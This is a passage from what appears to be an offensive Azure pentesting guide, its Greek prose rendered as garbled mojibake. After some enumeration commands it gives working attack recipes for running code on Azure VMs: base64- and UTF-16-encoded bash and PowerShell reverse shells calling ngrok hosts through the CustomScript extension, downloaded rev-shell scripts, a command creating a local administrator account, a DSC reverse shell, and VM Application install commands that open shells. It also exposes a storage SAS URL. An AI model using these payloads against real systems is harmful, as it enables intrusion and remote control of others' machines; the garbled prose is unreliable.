Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>

# Bastion
## List bastions
Get-AzBastion

# Network
## List all VNets in your subscription
Get-AzVirtualNetwork

## List VNet peering connections for a given VNet
(Get-AzVirtualNetwork -ResourceGroupName <ResourceGroupName> -Name <VNetName>).VirtualNetworkPeerings

## List Shared Resources (e.g., Azure Firewall) in the Hub
Get-AzFirewall

## List VPN Gateways
Get-AzVirtualNetworkGateway -ResourceGroupName <ResourceGroupName>

## List VPN Connections
Get-AzVirtualNetworkGatewayConnection -ResourceGroupName <ResourceGroupName>

## List ExpressRoute Circuits
Get-AzExpressRouteCircuit

# Misc
## List all virtual machine scale sets
Get-AzVmss

## List all availability sets
Get-AzAvailabilitySet

## List all load balancers
Get-AzLoadBalancer

## List all storage accounts
Get-AzStorageAccount

## List all custom script extensions on a specific VM
Get-AzVMExtension -VMName <VmName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎšÏÎ´Î¹ÎºÎ± ÏƒÎµ VMs

### Î•Ï€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ VM

ÎŸÎ¹ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ VM Ï„Î¿Ï… Azure ÎµÎ¯Î½Î±Î¹ Î¼Î¹ÎºÏÎ­Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ **Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·** ÎºÎ±Î¹ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½ÎµÏ‚ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ ÏƒÎµ ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ­Ï‚ Î¼Î·Ï‡Î±Î½Î­Ï‚ (VMs) Ï„Î¿Ï… Azure.

Î‘Ï…Ï„ÏŒ Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± **ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Î¹ ÎºÏÎ´Î¹ÎºÎµÏ‚ Î¼Î­ÏƒÎ± ÏƒÎµ VMs**.

Î— Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î· Î¬Î´ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ **`Microsoft.Compute/virtualMachines/extensions/write`**.

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Ï‰Î½ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÏ‰Î½ Î¼Îµ:

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# It takes some mins to run
az vm extension image list --output table

# Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# It takes some mins to run
Get-AzVMExtensionImage -Location <Location> -PublisherName <PublisherName> -Type <Type>
```
{% endcode %}
{% endtab %}
{% endtabs %}


Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ ÎºÏÎ´Î¹ÎºÎ±**:

{% tabs %}
{% tab title="Linux" %}
* Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î­Î½Î± reverse shell

{% code overflow="wrap" %}
```bash
# Prepare the rev shell
echo -n 'bash -i  >& /dev/tcp/2.tcp.eu.ngrok.io/13215 0>&1' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ==

# Execute rev shell
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{}' \
--protected-settings '{"commandToExecute": "nohup echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMi50Y3AuZXUubmdyb2suaW8vMTMyMTUgMD4mMQ== | base64 -d | bash &"}'
```
{% endcode %}

* Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group rsc-group> \
--vm-name <vm-name> \
--name CustomScript \
--publisher Microsoft.Azure.Extensions \
--version 2.1 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/8ce279967be0855cc13aa2601402fed3/raw/72816c3603243cf2839a7c4283e43ef4b6048263/hacktricks_touch.sh"]}' \
--protected-settings '{"commandToExecute": "sh hacktricks_touch.sh"}'
```
{% endcode %}
{% endtab %}

{% tab title="Windows" %}
* Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ reverse shell

{% code overflow="wrap" %}
```bash
# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Execute it
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{}' \
--protected-settings '{"commandToExecute": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}'

```
{% endcode %}

* Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î·Ï‚ Î¸Î®ÎºÎ·Ï‚ Î±Ï€ÏŒ Î±ÏÏ‡ÎµÎ¯Î¿

{% code overflow="wrap" %}
```bash
az vm extension set \
--resource-group <rsc-group> \
--vm-name <vm-name> \
--name CustomScriptExtension \
--publisher Microsoft.Compute \
--version 1.10 \
--settings '{"fileUris": ["https://gist.githubusercontent.com/carlospolop/33b6d1a80421694e85d96b2a63fd1924/raw/d0ef31f62aaafaabfa6235291e3e931e20b0fc6f/ps1_rev_shell.ps1"]}' \
--protected-settings '{"commandToExecute": "powershell.exe -ExecutionPolicy Bypass -File ps1_rev_shell.ps1"}'
```
{% endcode %}

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¬Î»Î»ÎµÏ‚ payloads ÏŒÏ€Ï‰Ï‚: `powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add`

* Î•Ï€Î±Î½Î±Ï†Î¿ÏÎ¬ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· VMAccess

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Î£Ï‡ÎµÏ„Î¹ÎºÎ­Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ VM

Î— Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î· Î¬Î´ÎµÎ¹Î± ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± **`Microsoft.Compute/virtualMachines/extensions/write`**.

<details>

<summary>Î•Ï€Î­ÎºÏ„Î±ÏƒÎ· VMAccess</summary>

Î‘Ï…Ï„Î® Î· ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (Î® Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î±Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹) Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÎµ Windows VMs.

{% code overflow="wrap" %}
```powershell
# Run VMAccess extension to reset the password
$cred=Get-Credential # Username and password to reset (if it doesn't exist it'll be created). "Administrator" username is allowed to change the password
Set-AzVMAccessExtension -ResourceGroupName "<rsc-group>" -VMName "<vm-name>" -Name "myVMAccess" -Credential $cred
```
{% endcode %}

</details>

<details>

<summary>DesiredConfigurationState (DSC)</summary>

Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· VM** Ï€Î¿Ï… Î±Î½Î®ÎºÎµÎ¹ ÏƒÏ„Î· Microsoft ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ PowerShell DSC Î³Î¹Î± Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Ï‰Î½ Azure Windows VMs. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± **ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Ï‰Î½ ÎµÎ½Ï„Î¿Î»ÏÎ½** ÏƒÎµ Windows VMs Î¼Î­ÏƒÏ‰ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·Ï‚:
```powershell
# Content of revShell.ps1
Configuration RevShellConfig {
Node localhost {
Script ReverseShell {
GetScript = { @{} }
SetScript = {
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',attacker-port);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length)
}
$client.Close()
}
TestScript = { return $false }
}
}
}
RevShellConfig -OutputPath .\Output

# Upload config to blob
$resourceGroup = 'dscVmDemo'
$storageName = 'demostorage'
Publish-AzVMDscConfiguration `
-ConfigurationPath .\revShell.ps1 `
-ResourceGroupName $resourceGroup `
-StorageAccountName $storageName `
-Force

# Apply DSC to VM and execute rev shell
$vmName = 'myVM'
Set-AzVMDscExtension `
-Version '2.76' `
-ResourceGroupName $resourceGroup `
-VMName $vmName `
-ArchiveStorageAccountName $storageName `
-ArchiveBlobName 'revShell.ps1.zip' `
-AutoUpdate `
-ConfigurationName 'RevShellConfig'
```
</details>

<details>

<summary>Î¥Î²ÏÎ¹Î´Î¹ÎºÏŒÏ‚ Î•ÏÎ³Î±Î¶ÏŒÎ¼ÎµÎ½Î¿Ï‚ Runbook</summary>

Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· VM Ï€Î¿Ï… Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· runbooks ÏƒÎµ VMs Î±Ï€ÏŒ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± [Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Î¯ Î‘Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚](../az-automation-account/).

</details>

### Î•Ï†Î±ÏÎ¼Î¿Î³Î­Ï‚ VM

Î‘Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÎºÎ­Ï„Î± Î¼Îµ ÏŒÎ»Î± Ï„Î± **Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÎºÎ±Î¹ ÏƒÎµÎ½Î¬ÏÎ¹Î± ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î±Ï€ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎ¿Ï…Î½ ÎºÎ±Î¹ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎ¿Ï…Î½ ÎµÏÎºÎ¿Î»Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÏƒÎµ VMs.

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

Î‘Ï…Ï„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ Î¿Î¹ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ ÏŒÏ€Î¿Ï… Î¿Î¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÎºÎ±Ï„ÎµÎ²Î±Î¯Î½Î¿Ï…Î½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½:

* Linux: `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows: `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

Î•Î»Î­Î³Î¾Ï„Îµ Ï€ÏÏ‚ Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Î½Î­ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÏƒÏ„Î¿ [https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)

{% hint style="danger" %}
Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **Î¼Î¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ ÎºÎ±Î¹ Î³ÎºÎ±Î»ÎµÏÎ¯ Î¼Îµ Î¬Î»Î»ÎµÏ‚ ÏƒÏ…Î½Î´ÏÎ¿Î¼Î­Ï‚ Î® ÎµÎ½Î¿Î¹ÎºÎ¹Î±ÏƒÏ„Î­Ï‚**. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î³Î¹Î±Ï„Î¯ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï€Î¯ÏƒÏ‰ Ï€ÏŒÏÏ„Î± ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Ï€Î·Î´Î®ÏƒÎµÎ¹ ÏƒÎµ Î¬Î»Î»ÎµÏ‚ ÏƒÏ…Î½Î´ÏÎ¿Î¼Î­Ï‚ ÎºÎ±Î¹ ÎµÎ½Î¿Î¹ÎºÎ¹Î±ÏƒÏ„Î­Ï‚.
{% endhint %}

Î‘Î»Î»Î¬ **Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± "Î±Î³Î¿ÏÎ¬" Î³Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ vm** ÏŒÏ€Ï‰Ï‚ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î³Î¹Î± Ï„Î¹Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚.

ÎŸÎ¹ Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÎ¯Î½Î±Î¹:

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Î¸Î±Î¯ÏÎµÏ„Ï‰Î½ ÎµÎ½Ï„Î¿Î»ÏÎ½:

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Î”ÎµÎ´Î¿Î¼Î­Î½Î± Ï‡ÏÎ®ÏƒÏ„Î·

